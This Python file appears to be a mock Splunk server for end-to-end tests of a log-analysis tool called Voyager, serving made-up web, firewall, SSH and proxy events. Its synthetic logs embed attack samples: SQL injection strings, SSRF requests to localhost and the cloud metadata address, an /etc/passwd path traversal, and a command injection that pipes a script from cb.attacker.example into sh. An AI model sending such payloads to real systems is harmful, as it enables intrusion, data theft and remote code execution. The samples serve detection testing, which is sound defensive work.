"""Mock Splunk Web for end-to-end tests of Voyager (python tests/mock_splunk.py PORT).

Answers the REST calls the exporter makes (config, current-context, jobs, results, control) for:
- the network analysis aggregation (... | stats ... by site uri_path uri_query) over synthetic web traffic;
- the entity mapper's stage-1 counts (stats count by index sourcetype _time) and raw pulls.
All data is made up: documentation address ranges and *.example names.
"""
import csv
import io
import itertools
import json
import random
import re
import sys
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs, unquote_plus

random.seed(7)
T0 = int(datetime(2026, 10, 20, tzinfo=timezone.utc).timestamp())
EV = []   # t, index, sourcetype, host, raw, web (dict for web events)


def web(t, ip, site, path, query, status=200, action="allowed"):
    uri = path + ("?" + query if query else "")
    ts = datetime.fromtimestamp(t, timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
    raw = f'{ip} - - [{ts}] "GET {uri} HTTP/1.1" {status} 512 "-" "Mozilla/5.0" site={site}'
    EV.append({"t": t, "index": "web", "sourcetype": "access_combined", "host": "web-01", "raw": raw,
               "web": {"site": site, "uri_path": path, "uri_query": query, "src": ip, "status": str(status), "action": action}})


def other(t, index, st, host, raw):
    EV.append({"t": t, "index": index, "sourcetype": st, "host": host, "raw": raw})


# normal traffic, 3 days
for i in range(1500):
    t = T0 + random.randint(0, 3 * 86400)
    web(t, f"192.0.2.{random.randint(1, 60)}", random.choice(["shop.example", "app.example"]),
        random.choice(["/", "/search", "/item", "/login"]), random.choice(["", "q=shoes", "id=" + str(random.randint(1, 999))]))
# attacker 1: SQL injection on the shop, day 2 02:10
A1, A2, CB = "203.0.113.7", "198.51.100.23", "cb.attacker.example"
t = T0 + 86400 + 2 * 3600 + 600
for q in ["q=%27", "q=%27%20OR%201%3D1--", "q=%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--",
          "q=1%27%20AND%20SLEEP(5)--"]:
    for k in range(3):
        web(t, A1, "shop.example", "/search", q, 500)
        t += 20
# attacker 2: SSRF, file read and command injection on the app, day 2 02:59
t = T0 + 86400 + 2 * 3600 + 59 * 60
for q in ["url=http%3A%2F%2F127.0.0.1%3A7001%2Fconsole", "url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"]:
    for k in range(4):
        web(t, A2, "app.example", "/api/proxy", q)
        t += 30
web(t + 60, A2, "app.example", "/download", "file=..%2F..%2F..%2F..%2Fetc%2Fpasswd")
web(t + 300, A2, "app.example", "/ping", f"host=127.0.0.1%3Bcurl%20http%3A%2F%2F{CB}%2Fx.sh%7Csh")
# the same actors elsewhere
for k in range(30):
    other(T0 + 86400 + 2 * 3600 + 50 * 60 + k * 20, "net", "fw:traffic", "fw-01",
          f"action=allowed src={A2} dst=10.0.0.5 dport=443 proto=tcp")
for k in range(8):
    other(T0 + 86400 + 3 * 3600 + k * 40, "os", "linux_secure", "app-01",
          f"sshd[2211]: Failed password for invalid user admin from {A2} port {40000 + k} ssh2")
other(T0 + 86400 + 3 * 3600 + 10 * 60, "proxy", "squid", "proxy-01",
      f"TCP_MISS/200 2048 GET http://{CB}/x.sh - DIRECT/{CB} text/x-sh client=10.0.0.5")
for k in range(5):
    other(T0 + 86400 + 1800 + k * 60, "net", "fw:traffic", "fw-01", f"action=blocked src={A1} dst=10.0.0.8 dport=22 proto=tcp")

JOBS, SEQ = {}, itertools.count(1)


def quoted(s):
    return [re.sub(r"\\(.)", r"\1", q) for q in re.findall(r'"((?:[^"\\]|\\.)*)"', s)]


def iso(t):
    return datetime.fromtimestamp(t, timezone.utc).isoformat(timespec="milliseconds")


def run(search, e, l):
    if "by site uri_path uri_query" in search:      # network analysis aggregation
        g = {}
        for ev in EV:
            w = ev.get("web")
            if w and e <= ev["t"] < l:
                k = (w["site"], w["uri_path"], w["uri_query"])
                r = g.setdefault(k, {"site": k[0], "uri_path": k[1], "uri_query": k[2], "count": 0, "et": ev["t"],
                                     "lt": ev["t"], "src": set(), "status": set(), "action": set()})
                r["count"] += 1
                r["et"], r["lt"] = min(r["et"], ev["t"]), max(r["lt"], ev["t"])
                r["src"].add(w["src"]); r["status"].add(w["status"]); r["action"].add(w["action"])
        rows = []
        for r in g.values():
            rows.append({**r, "count": str(r["count"]), "et": f"{r['et']:.3f}", "lt": f"{r['lt']:.3f}",
                         "src": sorted(r["src"]) if len(r["src"]) > 1 else next(iter(r["src"])),
                         "status": sorted(r["status"]) if len(r["status"]) > 1 else next(iter(r["status"])),
                         "action": next(iter(r["action"]))})
        return rows, ["site", "uri_path", "uri_query", "count", "et", "lt", "src", "status", "action"]
    qs = quoted(search)
    if "stats count by index sourcetype _time" in search:    # entity mapper, stage 1
        iocs = [q.lower() for q in qs]
        agg = {}
        for ev in EV:
            if e <= ev["t"] < l and any(i in ev["raw"].lower() for i in iocs):
                k = (ev["index"], ev["sourcetype"], int(ev["t"] // 3600 * 3600))
                agg[k] = agg.get(k, 0) + 1
        rows = [{"index": i, "sourcetype": s, "_time": iso(t), "count": c} for (i, s, t), c in sorted(agg.items(), key=lambda x: x[0][2])]
        return rows, ["index", "sourcetype", "_time", "count"]
    idx, st, iocs = qs[0], qs[1], [q.lower() for q in qs[2:]]   # entity mapper, raw pull
    rows = [{"_time": iso(ev["t"]), "_raw": ev["raw"], "index": ev["index"], "sourcetype": ev["sourcetype"], "host": ev["host"]}
            for ev in sorted(EV, key=lambda x: x["t"]) if ev["index"] == idx and ev["sourcetype"] == st
            and e <= ev["t"] < l and any(i in ev["raw"].lower() for i in iocs)]
    return rows, ["_time", "_raw", "index", "sourcetype", "host"]


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def send(self, code, body, ct="application/json"):
        b = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        u, q = urlparse(self.path), parse_qs(urlparse(self.path).query)
        if u.path.endswith("/config"):
            return self.send(200, json.dumps({"USERNAME": "tester", "DEFAULT_NAMESPACE": "search"}))
        if u.path.endswith("/current-context"):
            return self.send(200, json.dumps({"entry": [{"content": {"username": "tester"}}]}))
        parts = u.path.split("/")
        if "jobs" not in parts:
            return self.send(404, "{}")
        j = JOBS.get(parts[parts.index("jobs") + 1])
        if not j or j.get("gone"):
            return self.send(404, "{}")
        if parts[-1] in ("results", "events"):
            off, cnt = int(q["offset"][0]), int(q["count"][0])
            page = j["rows"][off:off + cnt]
            if q["output_mode"][0] == "json":
                return self.send(200, json.dumps({"results": page}))
            s = io.StringIO()
            w = csv.DictWriter(s, fieldnames=j["cols"])
            w.writeheader()
            w.writerows(page)
            return self.send(200, s.getvalue(), "text/csv")
        n = len(j["rows"])
        return self.send(200, json.dumps({"entry": [{"content": {
            "isDone": True, "dispatchState": "DONE", "doneProgress": 1, "resultCount": n, "eventCount": n, "scanCount": n,
            "runDuration": 1, "reportSearch": "stats" if "stats" in j["search"] else "", "messages": [], "ttl": 600}}]}))

    def do_POST(self):
        body = parse_qs(self.rfile.read(int(self.headers.get("Content-Length") or 0)).decode())
        if self.path.endswith("/control"):
            sid = self.path.split("/")[-2]
            if sid in JOBS and body.get("action", [""])[0] == "cancel":
                JOBS[sid]["gone"] = True
            return self.send(200, "{}")
        search = body["search"][0]
        rows, cols = run(search, int(float(body["earliest_time"][0])), int(float(body["latest_time"][0])))
        sid = f"job.{next(SEQ)}"
        JOBS[sid] = {"rows": rows, "cols": cols, "search": search}
        return self.send(201, json.dumps({"sid": sid}))

    def do_DELETE(self):
        parts = urlparse(self.path).path.split("/")
        if "jobs" in parts:
            JOBS.get(parts[parts.index("jobs") + 1], {})["gone"] = True
        return self.send(200, "{}")


if __name__ == "__main__":
    ThreadingHTTPServer(("127.0.0.1", int(sys.argv[1])), H).serve_forever()
